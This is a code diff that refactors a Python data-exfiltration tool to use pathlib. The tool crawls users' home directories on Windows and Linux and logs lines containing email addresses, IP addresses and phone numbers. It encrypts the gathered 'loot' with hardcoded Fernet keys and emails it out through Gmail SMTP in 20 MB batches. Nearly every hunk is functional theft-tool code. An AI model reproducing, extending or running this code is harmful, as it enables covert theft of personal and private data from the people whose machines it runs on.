@@ -13,6 +13,7 @@ import re
 import shutil
 import smtplib
 import sys
+from pathlib import Path
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
@@ -22,7 +23,7 @@ from hashlib import sha512
 from cryptography.fernet import Fernet
 
 
-def create_attachment(path: str, file: str) -> MIMEBase:
+def create_attachment(path: Path, file: str) -> MIMEBase:
     """
     Creates attachment instance, populates it, and returns it to send_main() function.
 
@@ -34,7 +35,7 @@ def create_attachment(path: str, file: str) -> MIMEBase:
     payload = MIMEBase('application', 'octet-stream')
 
     # Open the file and set as attachment payload #
-    with open(f'{path}{file}', 'rb') as attachment:
+    with path.open('rb') as attachment:
         payload.set_payload(attachment.read())
 
     # Encode attachment as base64 #
@@ -67,7 +68,7 @@ def smtp_handler(email_addr: str, secret: str, message: MIMEMultipart):
     # If socket or SMTP error occurs #
     except (OSError, smtplib.SMTPException) as mail_err:
         print_err(f'SMTP error occurred: {mail_err}')
-        logging.exception('SMTP error occurred: %s\n\n', mail_err)
+        logging.exception('SMTP error occurred: %s\n', mail_err)
 
 
 def create_email(email_addr: str) -> MIMEMultipart:
@@ -90,7 +91,7 @@ def create_email(email_addr: str) -> MIMEMultipart:
     return email
 
 
-def send_email(path: str):
+def send_email(path: Path):
     """
     Facilitates exfiltrating encrypted loot data via Gmail.
 
@@ -114,14 +115,16 @@ def send_email(path: str):
 
     attach_list = []
     # Add files in path to the attachment file list #
-    [attach_list.append(file.name) for file in os.scandir(path) if not os.path.isdir(file.name)]
+    [attach_list.append(file.name) for file in os.scandir(str(path.resolve()))
+     if not os.path.isdir(file.name)]
 
     # Iterate though result files and attach to email #
     for file in attach_list:
+        file_path = path / file
         # If item is encrypted attachment file #
         if re_attachment.match(file):
             # Add size of file to total email size #
-            file_size = os.stat(f'{path}{file}').st_size
+            file_size = file_path.stat().st_size
             email_size += file_size
 
             # If the email size is greater than or equal to 20 MB #
@@ -135,7 +138,7 @@ def send_email(path: str):
                 email_size = file_size
 
             # Create attachment instance of current file #
-            payload = create_attachment(path, file)
+            payload = create_attachment(file_path, file)
             # Attach attachment to message #
             msg.attach(payload)
 
@@ -143,7 +146,7 @@ def send_email(path: str):
     smtp_handler(email_address, password, msg)
 
 
-def crypto_hash(path: str):
+def crypto_hash(path: Path):
     """
     Encrypts the hashes file.
 
@@ -153,25 +156,28 @@ def crypto_hash(path: str):
     # Encrypt file with hashes #
     hash_key = b'AP92lIGyU8Zqnc568KT5ugjInAo28qwBuB5fzWYQfz0='
 
+    plain_sha_path = path / 'sha_hashes.txt'
+    crypt_sha_path = path / 'e_sha_hashes.txt'
+
     try:
         # Read the file hashes in plain text #
-        with open(f'{path}SHA_Hashes.txt', 'rb') as plain_text:
+        with plain_sha_path.open('rb') as plain_text:
             data = plain_text.read()
 
         # Encrypt the file hashes #
         encrypted = Fernet(hash_key).encrypt(data)
 
         # Write the encrypted file hashes to fresh file #
-        with open(f'{path}e_SHA_Hashes.txt', 'wb') as encrypted_text:
+        with crypt_sha_path.open('wb') as encrypted_text:
             encrypted_text.write(encrypted)
 
     # If error occurs during file operation #
     except (IOError, OSError) as io_err:
         print_err(f'Error occurred accessing hash files: {io_err}')
-        logging.exception('Error occurred accessing hash files: %s\n\n', io_err)
+        logging.exception('Error occurred accessing hash files: %s\n', io_err)
 
 
-def crypto_data(path: str):
+def crypto_data(path: Path):
     """
     Hashes the plain text data, encrypts the data, then hashes the encrypted data.
 
@@ -182,44 +188,48 @@ def crypto_data(path: str):
     key = b'UR58Mz1VHiGJa1_W42E4G0FD__Ihb4vevs3wmWhVtOc='
 
     # Iterate through files in path #
-    for file in os.scandir(path):
+    for file in os.scandir(str(path.resolve())):
         # If the current item is dir #
         if os.path.isdir(file.name):
             continue
+
+        hash_path = path / 'sha_hashes.txt'
+        plain_path = path / file.name
+        crypt_path = path / f'e_{file.name}'
 
         try:
             # Hash the plain text file #
             sha = sha512(str.encode(file.name)).hexdigest()
 
             # Write the hash to the hashes file #
-            with open(f'{path}SHA_Hashes.txt', 'a', encoding='utf-8') as hash_plain:
+            with hash_path.open('a', encoding='utf-8') as hash_plain:
                 hash_plain.write(f'{file.name}\nPlain Text SHA:\n{str(sha)}\n')
 
             # Read the file contents and encrypt them #
-            with open(f'{path}{file.name}', 'rb') as plain_text:
+            with plain_path.open('rb') as plain_text:
                 data = plain_text.read()
 
             # Encrypt the plain text #
             encrypted = Fernet(key).encrypt(data)
 
             # Write encrypted cipher to text to fresh file #
-            with open(f'{path}e_{file.name}', 'wb') as encrypted_text:
+            with crypt_path.open('wb') as encrypted_text:
                 encrypted_text.write(encrypted)
 
             # Hash the cipher text file #
             e_sha = sha512(str.encode(f'e_{file.name}')).hexdigest()
 
             # Write the hash of cipher text to hash file #
-            with open(f'{path}SHA_Hashes.txt', 'a', encoding='utf-8') as hash_encrypt:
+            with hash_path.open('a', encoding='utf-8') as hash_encrypt:
                 hash_encrypt.write(f'\nEncrypted SHA:\n{str(e_sha)}\n\n\n')
 
         # If error occurs during file operation #
         except (IOError, OSError) as io_err:
             print_err(f'Error occurred accessing hash files: {io_err}')
-            logging.exception('Error occurred accessing hash files: %s\n\n', io_err)
+            logging.exception('Error occurred accessing hash files: %s\n', io_err)
 
 
-def match_logger(re_obj: object, dir_path: str, file: str, path: str, match_count: int) -> int:
+def match_logger(re_obj: object, dir_path: str, file: str, path: Path, match_count: int) -> int:
     """
     Iterates through file line by line, attempting to find regex matches to log to the log file.
 
@@ -238,35 +248,36 @@ def match_logger(re_obj: object, dir_path: str, file: str, path: str, match_coun
         else:
             match_path = f'{dir_path}/{file}'
 
-        match_log = f'{path}crawlMatches{match_count}.txt'
+        match_log = path / f'crawl_matches_{match_count}.txt'
 
         # Open the file, iterating line by line #
         with open(match_path, 'r', encoding='utf-8') as search_file:
             for line in search_file:
                 print(line)
-
                 # If line matches a regular expression #
-                if re_obj.email.search(line) or re_obj.ip_addr.search(line)\
+                if re_obj.email.search(line) or re_obj.ip_addr.search(line) \
                 or re_obj.phone.search(line):
                     # Check if log file is within the set size limit, if not set new log file #
-                    match_log, match_count = size_check(match_log, match_count,
-                                                        path, 'crawlMatches')
+                    match_log, match_count = size_check(match_log, match_count, path)
                     # Write results to match file #
-                    with open(match_log, 'a', encoding='utf-8') as details:
+                    with match_log.open('a', encoding='utf-8') as details:
                         details.write(f'Path => {dir_path}\n')
                         details.write(f'File => {file}\n')
                         details.write(f'Match => {line}\n\n')
 
     # If error occurs during file operation #
-    except (IOError, OSError, UnicodeError) as file_err:
-        if not UnicodeError:
-            print_err('Error occurred during file operation to match log')
-            logging.exception('Error occurred during file operation to match log: %s\n\n', file_err)
+    except (IOError, OSError) as file_err:
+        print_err('Error occurred during file operation to match log')
+        logging.exception('Error occurred during file operation to match log: %s\n', file_err)
+
+    # If minor encoding error occurs #
+    except UnicodeError:
+        pass
 
     return match_count
 
 
-def size_check(log_name: str, log_num: int, log_path: str, base_name: str) -> tuple:
+def size_check(log_name: Path, log_num: int, log_path: Path) -> tuple:
     """
     Checks the size of the passed in log name. If it is greater than or equal to 10 MB, increment \
     the log number and reset the log name with the log number. So log_name1 would become log_name2.
@@ -274,15 +285,15 @@ def size_check(log_name: str, log_num: int, log_path: str, base_name: str) -> tu
     :param log_name:  The name of the logger file.
     :param log_num:  The current logger file number.
     :param log_path:  The file path where the logger file is stored.
-    :param base_name:  The base name of the log file.
     :return: The logger file name and number, modified or not.
     """
     try:
         # If the file size is greater than or equal than 10 MB
-        if os.stat(log_name).st_size >= 10_000_000:
+        if log_name.stat().st_size >= 10_000_000:
             # Increment log count and reformat name #
             log_num += 1
-            log_name = f'{log_path}{base_name}{log_num}.txt'
+            new_path = log_path / f'crawl_log_{log_num}.txt'
+            log_name = Path(str(new_path.resolve()))
 
     # If the log file does not exist yet #
     except FileNotFoundError:
@@ -292,7 +303,9 @@ def size_check(log_name: str, log_num: int, log_path: str, base_name: str) -> tu
 
 
 class CompiledRegex:
-    """ Class to group various compiled regex statements. """
+    """
+    Class to group various compiled regex statements.
+    """
     txt = None
     file = None
     email = None
@@ -322,13 +335,8 @@ def main():
 
     # If the OS is Windows #
     if os.name == 'nt':
-        path = 'C:\\Tmp\\'
-        crawl_path = 'C:\\Users'
-
-        # Ensure storage path for exfiltration data exists #
-        pathlib.Path(path).mkdir(parents=True, exist_ok=True)
-        # Initialize logging facilities #
-        logging.basicConfig(level=logging.DEBUG, filename=f'{path}\\error_log.log')
+        path = Path('C:\\Tmp')
+        crawl_path = Path('C:\\Users')
 
         # Set accepted file types with tuple grouping #
         ext = ('.accdb', '.bat', '.c', '.cc', '.cpp', '.css', '.csv', '.db', '.doc', '.docm',
@@ -339,18 +347,13 @@ def main():
         re_obj.txt = re.compile(r'[^<>:\"/\\|?*]{1,255}$')
     # If the OS is Linux #
     else:
-        path = '/tmp/crawl_files/'
-        crawl_path = '/home'
-
-        # Ensure storage path for exfiltration data exists #
-        pathlib.Path(path).mkdir(parents=True, exist_ok=True)
-        # Initialize logging facilities #
-        logging.basicConfig(level=logging.DEBUG, filename=f'{path}/error_log.log')
+        path = Path('/tmp/crawl_files')
+        crawl_path = Path('/home')
 
         # Set accepted file types with tuple grouping #
-        ext = ('.asm', '.c', '.cc', '.conf', '.cfg', '.cpp', '.css', '.csv', '.db',
-               '.deb', '.h', '.htm', '.html', '.java', '.log', '.php', '.phps',
-               '.phtml', '.pl', '.py', '.rtf', '.s', '.sh', '.txt', '.xml')
+        ext = ('.asm', '.c', '.cc', '.conf', '.cfg', '.cpp', '.css', '.csv', '.db', '.deb', '.h',
+               '.htm', '.html', '.java', '.log', '.php', '.phps', '.phtml', '.pl', '.py', '.rtf',
+               '.s', '.sh', '.txt', '.xml')
 
         # Format program regex #
         re_obj.txt = re.compile(r'[^/]{1,255}$')
@@ -361,17 +364,26 @@ def main():
     re_obj.ip_addr = re.compile(r'(?:\s|^)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
     re_obj.phone = re.compile(r'(1?)(?:\s|^)\d{3}-\d{3}-\d{4}')
 
+    # Ensure storage path for exfiltration data exists #
+    pathlib.Path(str(path.resolve())).mkdir(parents=True, exist_ok=True)
+    # Format the log file path #
+    log_file = path / 'err_log.log'
+    # Initialize logging facilities #
+    # Initialize the logging facilities #
+    logging.basicConfig(filename=str(log_file.resolve()), level=logging.DEBUG,
+                        format='%(asctime)s line%(lineno)d::%(funcName)s[%(levelname)s]>>'
+                        ' %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
     log_count = 1
     match_count = 1
-    crawl_log = f'{path}crawlLog{log_count}.txt'
+    crawl_log = path / f'crawl_log_{log_count}.txt'
 
     # Iterate recursively through paths, directories, and files in path #
-    for dir_path, dir_names, file_names in os.walk(crawl_path):
+    for dir_path, dir_names, file_names in os.walk(str(crawl_path.resolve())):
         # Check if log file is within the set size limit, if not set new log file #
-        crawl_log, log_count = size_check(crawl_log, log_count, path, 'crawlLog')
+        crawl_log, log_count = size_check(crawl_log, log_count, path)
 
         # Open the crawl in append mode to log matches #
-        with open(crawl_log, 'a', encoding='utf-8') as log:
+        with crawl_log.open('a', encoding='utf-8') as log:
             log.write(f'Path => {dir_path}\n')
 
             # Iterate through directories and log names #
@@ -414,7 +426,7 @@ def main():
 
     # If unable to delete because being used by other process #
     except PermissionError as del_err:
-        logging.exception('Error occurred deleting contents: %s\n\n', del_err)
+        logging.exception('Error occurred deleting contents: %s\n', del_err)
 
     print('\nAll Done!!')
 
